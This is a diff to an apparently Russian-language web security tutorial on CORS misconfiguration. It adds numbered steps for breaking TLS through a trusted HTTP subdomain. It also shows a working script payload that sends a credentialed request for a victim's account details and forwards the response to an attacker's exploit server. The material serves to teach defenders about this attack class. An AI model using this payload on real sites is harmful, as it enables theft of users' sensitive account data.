@@ -83,10 +83,29 @@ normal-website.com.evil-user.net
 
 * **Взлом TLS с плохо настроенным CORS**
 
+* Пользователь-жертва делает любой простой HTTP-запрос.
+
+* Атакующий внедряет перенаправление на:
+http://trusted-subdomain.vulnerable-website.com
+
+* Браузер жертвы следует перенаправлению.
+
+* Атакующий перехватывает простой HTTP-запрос и возвращает поддельный ответ, содержащий запрос CORS, на:
+https://vulnerable-website.com
+
+* Браузер жертвы отправляет запрос CORS, включая источник:
+http://trusted-subdomain.vulnerable-website.com
+
+* Приложение разрешает запрос, поскольку это источник из белого списка. Запрошенные конфиденциальные данные возвращаются в ответе.
+
+* Поддельная страница атакующего может считывать конфиденциальные данные и передавать их на любой домен, находящийся под контролем атакующего.
+
+Эта атака эффективна, даже если уязвимый веб-сайт в остальном надежно использует HTTPS, без конечной точки HTTP и все файлы cookie помечены как безопасные.
+```
 <script>
     document.location="http://victim-server.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim-server/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://my.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
-
+```
 * **Интрасети и CORS без учетных данных**
 
 Большинство атак CORS полагаются на наличие заголовка ответа:
